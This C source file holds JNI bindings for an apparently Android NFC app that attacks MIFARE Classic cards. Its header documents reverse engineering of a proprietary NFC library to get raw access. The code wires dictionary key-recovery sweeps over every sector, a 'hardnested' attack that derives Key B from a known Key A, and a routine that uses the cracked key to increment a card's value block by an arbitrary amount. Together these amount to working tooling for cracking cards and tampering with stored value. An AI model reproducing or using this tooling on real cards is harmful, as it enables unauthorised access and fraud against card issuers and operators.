// JNI entry points (Java_com_redmi_iceman_probe_MfcNative_*) plus the one
// implementation of mfc_transceive() (mfc_transport.h) this whole project
// funnels RF I/O through.
//
// *** WIRE FORMAT: CORRECTED BY DISASSEMBLY, STILL NOT FULLY RESOLVED ***
// An earlier version of this file guessed a self-describing
// [len][data][packed parity] frame for IHciAdapter.transceive(byte[]).
// That guess is now known to be WRONG: static analysis of
// libtmsnfc-nci.so (extracted/natives/lib/arm64-v8a/) shows
//
//   - TX: NFA_SendRawPtmCommand(uint16_t len, uint8_t* data) does a plain
//     memcpy of the caller's bytes into a GKI message buffer and hands it
//     to nfc_ncif_check_cmd_queue() -- the SAME queue every ordinary NCI
//     command goes through. It adds no header, no parity, no framing of
//     any kind. Whatever bytes the app supplies are therefore expected to
//     already be a complete, valid NCI-command-shaped packet (its own
//     MT/PBF/GID + OID + length header), not raw ISO14443-3 RF bytes.
//   - RX: nci_proc_passthrough_mode() intercepts incoming NCI packets
//     while passthrough mode is active, gates on a check byte at payload
//     offset +8/+9, and invokes the native callback as
//     (event_byte, total_len, pointer_to_payload+8) -- i.e. there is a
//     TMS-proprietary sub-header of at least 8 bytes ahead of whatever
//     "real" response data eventually reaches the app. Its exact field
//     layout (sequence id? connection id? a parity byte?) was not
//     recoverable from static disassembly alone within reasonable effort
//     (would need a proper decompiler or live captures).
//
// Net effect: this function is now a straight, unmodified passthrough in
// both directions -- inventing framing here would just reintroduce the
// same wrong guess at a different layer. Building a correct NCI-shaped
// command (proprietary GID/OID for "raw MIFARE exchange", plus wherever
// parity actually lives) belongs one level up, in mfc_proto.c, once that
// proprietary format is known -- from live hardware captures once
// WRITE_SECURE_SETTINGS is available, or further reverse engineering with
// better tooling than objdump+manual tracing. See
// docs/tms_protocol.md section 7 for the full writeup and evidence.
#include <jni.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>

#include "mfc_proto.h"
#include "mfc_resources.h"
#include "cmdhfmfhard.h" // mfnestedhard()

static JavaVM *g_jvm = NULL;
static jobject g_ptm_transport = NULL; // global ref to the Java PtmTransport instance
static jmethodID g_transceive_mid = NULL;

static JNIEnv *get_env(void) {
    JNIEnv *env = NULL;
    if ((*g_jvm)->GetEnv(g_jvm, (void **)&env, JNI_VERSION_1_6) != JNI_OK) {
        return NULL;
    }
    return env;
}

int mfc_transceive(const uint8_t *tx, uint16_t tx_len, const uint8_t *tx_par,
                    uint8_t *rx, uint16_t rx_cap, uint8_t *rx_par) {
    (void)tx_par; (void)rx_par; // no known parity channel at this level -- see file header comment

    JNIEnv *env = get_env();
    if (env == NULL || g_ptm_transport == NULL) return -1;

    jbyteArray jtx = (*env)->NewByteArray(env, (jsize)tx_len);
    if (jtx == NULL) return -1;
    (*env)->SetByteArrayRegion(env, jtx, 0, (jsize)tx_len, (const jbyte *)tx);

    jbyteArray jrx = (jbyteArray)(*env)->CallObjectMethod(env, g_ptm_transport, g_transceive_mid, jtx, (jlong)1000);
    (*env)->DeleteLocalRef(env, jtx);

    if (jrx == NULL) return 0; // timeout

    jsize jrx_len = (*env)->GetArrayLength(env, jrx);
    jbyte *jrx_bytes = (*env)->GetByteArrayElements(env, jrx, NULL);

    int result = 0;
    if (jrx_len > 0) {
        uint16_t n = (uint16_t)(jrx_len < rx_cap ? jrx_len : rx_cap);
        memcpy(rx, jrx_bytes, n);
        result = n;
    }

    (*env)->ReleaseByteArrayElements(env, jrx, jrx_bytes, JNI_ABORT);
    (*env)->DeleteLocalRef(env, jrx);
    return result;
}

JNIEXPORT jint JNICALL
Java_com_redmi_iceman_probe_MfcNative_nativeInit(JNIEnv *env, jclass clazz, jobject ptmTransport, jstring resourcesDir) {
    (void)clazz;
    (*env)->GetJavaVM(env, &g_jvm);

    if (g_ptm_transport != NULL) {
        (*env)->DeleteGlobalRef(env, g_ptm_transport);
    }
    g_ptm_transport = (*env)->NewGlobalRef(env, ptmTransport);

    jclass ptmClass = (*env)->GetObjectClass(env, g_ptm_transport);
    g_transceive_mid = (*env)->GetMethodID(env, ptmClass, "transceive", "([BJ)[B");
    if (g_transceive_mid == NULL) return -1;

    const char *dir = (*env)->GetStringUTFChars(env, resourcesDir, NULL);
    mfc_resources_set_base_dir(dir);
    (*env)->ReleaseStringUTFChars(env, resourcesDir, dir);
    return 0;
}

JNIEXPORT void JNICALL
Java_com_redmi_iceman_probe_MfcNative_nativeSetUid(JNIEnv *env, jclass clazz, jint uid) {
    (void)env; (void)clazz;
    mfc_set_uid((uint32_t)uid);
}

static uint64_t hex_to_u64(const char *hex) {
    uint64_t v = 0;
    for (int i = 0; hex[i] != '\0' && i < 12; i++) {
        char c = hex[i];
        uint8_t nibble = (c >= '0' && c <= '9') ? (uint8_t)(c - '0')
                          : (c >= 'a' && c <= 'f') ? (uint8_t)(c - 'a' + 10)
                          : (c >= 'A' && c <= 'F') ? (uint8_t)(c - 'A' + 10) : 0;
        v = (v << 4) | nibble;
    }
    return v;
}

static jstring u64_to_hex_jstring(JNIEnv *env, uint64_t key) {
    char buf[13];
    snprintf(buf, sizeof(buf), "%012" PRIx64, key);
    return (*env)->NewStringUTF(env, buf);
}

// Command 1/3: autopwn -- dictionary attack, recovers Key A of `block`.
JNIEXPORT jstring JNICALL
Java_com_redmi_iceman_probe_MfcNative_nativeAutopwn(JNIEnv *env, jclass clazz, jint block) {
    (void)clazz;
    uint64_t found = 0;
    if (mfc_dict_attack((uint8_t)block, MFC_KEY_A, &found) != 0) {
        return NULL;
    }
    return u64_to_hex_jstring(env, found);
}

// Full-card autopwn over PTM: sweeps Key A + Key B of every sector,
// reusing keys already found on earlier sectors first (same optimization
// as the public-API sweep in MainActivity.autopwnFull()) before falling
// through to the built-in dictionary. One blocking call for the whole
// card -- no per-key progress callback into Java, since the entire point
// of this path is to avoid the per-call Binder/JNI overhead the public
// android.nfc.tech.MifareClassic API pays on every single key; a callback
// per key would reintroduce exactly that cost on the fast path this
// exists to test against.
//
// Returns a String[2*sectorCount]: index 2*s is sector s's Key A (or
// null), 2*s+1 is Key B (or null).
JNIEXPORT jobjectArray JNICALL
Java_com_redmi_iceman_probe_MfcNative_nativeAutopwnAll(JNIEnv *env, jclass clazz, jint sectorCount) {
    (void)clazz;
    jclass stringClass = (*env)->FindClass(env, "java/lang/String");
    jobjectArray result = (*env)->NewObjectArray(env, sectorCount * 2, stringClass, NULL);

    uint64_t *pool = (uint64_t *)malloc(sizeof(uint64_t) * (size_t)sectorCount * 2);
    int pool_n = 0;

    for (jint s = 0; s < sectorCount; s++) {
        uint8_t block = mfc_sector_first_block((uint8_t)s);

        uint64_t keyA = 0;
        if (mfc_dict_attack_ex(block, MFC_KEY_A, pool, pool_n, &keyA) == 0) {
            (*env)->SetObjectArrayElement(env, result, s * 2, u64_to_hex_jstring(env, keyA));
            pool[pool_n++] = keyA;
        }

        uint64_t keyB = 0;
        if (mfc_dict_attack_ex(block, MFC_KEY_B, pool, pool_n, &keyB) == 0) {
            (*env)->SetObjectArrayElement(env, result, s * 2 + 1, u64_to_hex_jstring(env, keyB));
            pool[pool_n++] = keyB;
        }
    }

    free(pool);
    return result;
}

// Command 2/3: hardnested -- recovers Key B of trg_block given a known Key
// A of block. Runs acquisition (via mfc_nested_*(), driven by the patched
// acquire_nonces() inside third_party/client_src/cmdhfmfhard.c) followed
// by the bitsliced brute force, entirely inside mfnestedhard().
JNIEXPORT jstring JNICALL
Java_com_redmi_iceman_probe_MfcNative_nativeHardnested(JNIEnv *env, jclass clazz,
                                                        jint block, jstring keyAHex,
                                                        jint trgBlock) {
    (void)clazz;
    const char *key_hex = (*env)->GetStringUTFChars(env, keyAHex, NULL);
    uint64_t key_a = hex_to_u64(key_hex);
    (*env)->ReleaseStringUTFChars(env, keyAHex, key_hex);

    uint8_t key6[6];
    for (int i = 0; i < 6; i++) key6[i] = (uint8_t)(key_a >> (8 * (5 - i)));

    uint64_t found_key = 0;
    int ret = mfnestedhard((uint8_t)block, MFC_KEY_A, key6,
                            (uint8_t)trgBlock, MFC_KEY_B, NULL,
                            false, false, false, 0, &found_key, NULL);
    if (ret != 0 /* PM3_SUCCESS */) {
        return NULL;
    }
    return u64_to_hex_jstring(env, found_key);
}

// Command 3/3: value --inc -- authenticates with Key B, increments the
// value block by `delta`, commits with TRANSFER.
JNIEXPORT jint JNICALL
Java_com_redmi_iceman_probe_MfcNative_nativeValueIncrement(JNIEnv *env, jclass clazz,
                                                            jint block, jstring keyBHex, jint delta) {
    (void)clazz;
    const char *key_hex = (*env)->GetStringUTFChars(env, keyBHex, NULL);
    uint64_t key_b = hex_to_u64(key_hex);
    (*env)->ReleaseStringUTFChars(env, keyBHex, key_hex);

    if (mfc_auth((uint8_t)block, MFC_KEY_B, key_b) != 0) return -1;

    int ret = mfc_value_op((uint8_t)block, MFC_VALUE_INC, (uint32_t)delta);
    if (ret != 0) { mfc_deauth(); return -2; }

    ret = mfc_transfer((uint8_t)block);
    mfc_deauth();
    return (ret == 0) ? 0 : -3;
}
